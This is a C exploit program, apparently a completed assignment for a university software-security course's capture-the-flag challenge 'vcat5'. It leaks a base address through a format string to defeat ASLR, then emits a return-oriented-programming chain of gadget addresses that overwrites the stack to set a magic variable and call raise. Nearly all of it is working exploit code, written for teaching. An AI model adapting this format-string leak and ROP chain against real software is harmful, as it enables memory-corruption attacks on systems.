/*
 * CTF-2 `vcat5' exploit (template)
 *
 * Vasileios P. Kemerlis <vpk@cs.brown.edu>
 *  - CSCI 1650: Software Security and Exploitation
 *  - https://cs.brown.edu/courses/csci1650/
 */

#include <sys/stat.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define	MAX_VAL		0xF0000000UL
#define	BUF_SZ		sizeof("0x00000000")
#define	FMT_STR		"%22$p"

// Determine how far to copy along in our payload buffer
#define RET_ADDR1_OFF 0x0000004c
#define DATA1_OFF (RET_ADDR1_OFF + 4)
#define RET_ADDR2_OFF (DATA1_OFF + 4)
#define DATA2_OFF (RET_ADDR2_OFF + 4)
#define RET_ADDR3_OFF (DATA2_OFF + 4)
#define RET_ADDR4_OFF (RET_ADDR3_OFF + 4)
#define RET_ADDR5_OFF (RET_ADDR4_OFF + 4)
#define RET_ADDR6_OFF (RET_ADDR5_OFF + 4)
#define DATA3_OFF (RET_ADDR6_OFF + 4)
#define RET_ADDR7_OFF (DATA3_OFF + 4)
#define RET_ADDR8_OFF (RET_ADDR7_OFF + 4)
#define DATA4_OFF (RET_ADDR8_OFF + 4)
#define RET_ADDR9_OFF (DATA4_OFF + 4)

// Debugging offsets
#define LEAK_OFF 0x000015c4
#define DEBUG_LEAK 0x410015c4

// Variables and GOT offsets:
#define GOT_OFF 0x00003114
#define MGK1_OFF 0x00005008
#define MGK2_OFF 0x0000500c
#define RND1_OFF 0x00004004
#define RND2_OFF 0x00004008

// Gadget offsets:
#define POP_EDX_OFF 0x0000124f
#define POP_EBX_OFF 0x0000101e
#define MOV_INDIR_EBX_EDX_OFF 0x0000125f
#define RAISE_PLT_OFF 0x00001030
#define MOV_EBX_EBX_OFF 0x0000123f
#define MOV_EDX_EDX_OFF 0x0000126f
#define ADD_EDX_EBX_OFF 0x0000127f

unsigned char payload[] =
	/* ------------------------------------	*/
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXX"
	/* ------------------------------------	*/
	/* FIXME */
	/* ------------------------------------	*/
	"\x1e\x90\x04\x08"		// Address of pop ebx gadget (0x0804901e)
	"\x04\xa0\x88\x0c"		// Address of rnd1
	"\x38\x71\x88\x0c"		// Address of pop edx gadget (0x0c887138)
	"\x08\xa0\x88\x0c"		// Address of rnd2
	"\x28\x71\x88\x0c"		// Address of mov [ebx] into ebx (0x0c887128)
	"\x58\x71\x88\x0c"		// Address of mov [edx] into edx (0x0c887158)
	"\x68\x71\x88\x0c"		// Address of add edx to ebx (0x0c887168)
	"\x38\x71\x88\x0c"		// Address of pop edx gadget (0x0c887138)
	"\x0c\xb0\x88\x0c"		// Address of mgk2
	"\x48\x71\x88\x0c"		// Address of mov ebx to [edx] (0x0c887148)
	"\x1e\x90\x04\x08"		// Address of pop ebx gadget
	"\xef\xbe\xad\xde"		// Address of GOT table (for raise)
	"\x30\x90\x04\x08"		// Address of raise in .plt (0x08049030)
	"\xef\xbe\xad\xde"		// DEADBEEF (extra return address)
	"\x0c\x00\x00\x00";		// SIGUSR1
	/* ------------------------------------	*/


int
main(int argc, char **argv)
{
	/* scratch space			*/
	char		buf[BUF_SZ];

	/* base address of `vcat5'		*/
	unsigned long	baddr;

	/* for ASLR goodies and whatnot */
	unsigned long addr_aslr;

	/* helper				*/
	struct stat	istat;

	/* cleanup				*/
	memset(buf, 0, BUF_SZ);

	/* leak the base address of `vcat5'	*/
	write(STDOUT_FILENO, FMT_STR, strlen(FMT_STR));
	read(STDIN_FILENO, buf, BUF_SZ-1);
	baddr = strtoul(buf, NULL, 16) - LEAK_OFF;

	// For debug only:
	//baddr = DEBUG_LEAK - LEAK_OFF;

	/* sanity check 			*/
	if (!fstat(STDIN_FILENO, &istat) && !S_ISFIFO(istat.st_mode)) {
		if (!baddr || baddr > MAX_VAL) {
			fprintf(stderr,
				"[-] baddr = 0x%08lx\n", baddr);
			fprintf(stderr,
				"[!] If you are debugging your exploit under GDB "
				"you need to type in the leaked address\n");
		}
	}

	/* fix the payload			*/
	addr_aslr = baddr + POP_EBX_OFF;
	memcpy(payload + RET_ADDR1_OFF, &addr_aslr, sizeof(addr_aslr));
	addr_aslr = baddr + RND1_OFF;
	memcpy(payload + DATA1_OFF, &addr_aslr, sizeof(addr_aslr));
	addr_aslr = baddr + POP_EDX_OFF;
	memcpy(payload + RET_ADDR2_OFF, &addr_aslr, sizeof(addr_aslr));
	addr_aslr = baddr + RND2_OFF;
	memcpy(payload + DATA2_OFF, &addr_aslr, sizeof(addr_aslr));
	addr_aslr = baddr + MOV_EBX_EBX_OFF;
	memcpy(payload + RET_ADDR3_OFF, &addr_aslr, sizeof(addr_aslr));
	addr_aslr = baddr + MOV_EDX_EDX_OFF;
	memcpy(payload + RET_ADDR4_OFF, &addr_aslr, sizeof(addr_aslr));
	addr_aslr = baddr + ADD_EDX_EBX_OFF;
	memcpy(payload + RET_ADDR5_OFF, &addr_aslr, sizeof(addr_aslr));
	addr_aslr = baddr + POP_EDX_OFF;
	memcpy(payload + RET_ADDR6_OFF, &addr_aslr, sizeof(addr_aslr));
	addr_aslr = baddr + MGK2_OFF;
	memcpy(payload + DATA3_OFF, &addr_aslr, sizeof(addr_aslr));
	addr_aslr = baddr + MOV_INDIR_EBX_EDX_OFF;
	memcpy(payload + RET_ADDR7_OFF, &addr_aslr, sizeof(addr_aslr));
	addr_aslr = baddr + POP_EBX_OFF;
	memcpy(payload + RET_ADDR8_OFF, &addr_aslr, sizeof(addr_aslr));
	addr_aslr = baddr + GOT_OFF;
	memcpy(payload + DATA4_OFF, &addr_aslr, sizeof(addr_aslr));
	addr_aslr = baddr + RAISE_PLT_OFF;
	memcpy(payload + RET_ADDR9_OFF, &addr_aslr, sizeof(addr_aslr));

	/*
	 * dump the payload in 'stdout'
	 * sizeof(payload)-1:	ignore the trailing '\0';
	 *			(strings are NULL terminated)
	 */
	write(STDOUT_FILENO, payload, sizeof(payload)-1);

	/* done; success			*/
	return EXIT_SUCCESS;
}
